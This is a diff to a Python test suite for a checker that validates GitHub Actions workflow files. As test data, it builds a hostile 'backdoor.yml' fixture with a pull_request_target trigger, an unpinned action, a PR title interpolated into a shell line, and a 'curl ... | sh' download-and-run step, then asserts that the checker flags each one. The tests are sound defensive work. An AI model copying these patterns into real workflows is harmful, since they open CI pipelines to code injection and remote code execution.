@@ -96,8 +96,8 @@ def test_workflow_policy_rejects_meaningful_gate_weakening():
         ),
         (
             "release.yml",
-            'python scripts/check_distribution.py dist --tag "${{ github.ref_name }}" --current',
-            'python scripts/check_distribution.py dist --tag "${{ github.ref_name }}"',
+            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG" --current',
+            'python scripts/check_distribution.py dist --tag "$RELEASE_TAG"',
         ),
         (
             "release.yml",
@@ -139,3 +139,57 @@ def test_distribution_content_guard_catches_local_home_paths():
     assert not _LOCAL_PATH_RE.search(b"/usr/" + b"roo" + b"t/share")
     # the guard's own pattern source must not be a self-match
     assert not _LOCAL_PATH_RE.search(b"(?:/home/|/Users/)[literal]")
+
+
+def test_workflow_policy_ignores_comments_and_checks_every_workflow_file(tmp_path):
+    """The checker was a substring matcher: every required step present only
+    inside `#` comments passed, an unpinned action or `pull_request_target`
+    in a fourth file was never read, and an expression interpolated into a
+    shell line went unnoticed. Comments are stripped first, every file in
+    the directory is held to the global rules, and the publish job's tag must
+    arrive through `env:`."""
+    from scripts.check_workflows import check_workflows, validate_workflow_texts
+
+    workflows = {
+        path.name: path.read_text(encoding="utf-8")
+        for path in (ROOT / ".github" / "workflows").iterdir()
+        if path.suffix == ".yml"
+    }
+    assert validate_workflow_texts(workflows) == []
+
+    # Guards and steps moved into comments no longer satisfy the checker.
+    commented = dict(workflows)
+    commented["release.yml"] = "\n".join(
+        ("# " + line if "startsWith(github.ref_name, 'v')" in line else line)
+        for line in workflows["release.yml"].splitlines()
+    )
+    assert any("publish guard is missing" in e for e in validate_workflow_texts(commented))
+
+    # Interpolating the tag straight into the shell line is refused.
+    inline = dict(workflows)
+    inline["release.yml"] = workflows["release.yml"].replace(
+        '--tag "$RELEASE_TAG"', '--tag "${{ github.ref_name }}"'
+    )
+    assert any("untrusted expression into a shell line" in e for e in validate_workflow_texts(inline))
+
+    # A fourth workflow file is read: fork-PR trigger, tag-pinned action, and
+    # an event expression in a run line are all reported.
+    extra = dict(workflows)
+    extra["backdoor.yml"] = (
+        "on:\n  pull_request_target:\njobs:\n  x:\n    runs-on: ubuntu-latest\n"
+        "    steps:\n      - uses: actions/checkout@v4\n"
+        "      - run: echo ${{ github.event.pull_request.title }}\n"
+        "      - run: curl -sSf https://x/install.sh | sh\n"
+    )
+    errors = validate_workflow_texts(extra)
+    assert any("pull_request_target" in e for e in errors)
+    assert any("unpinned action" in e for e in errors)
+    assert any("untrusted expression" in e for e in errors)
+    assert any("pipes a download" in e for e in errors)
+
+    # And check_workflows() reads the whole directory, not three fixed names.
+    for name, text in extra.items():
+        (tmp_path / name).write_text(text, encoding="utf-8")
+    assert check_workflows(tmp_path)
+    (tmp_path / "backdoor.yml").unlink()
+    assert check_workflows(tmp_path) == []
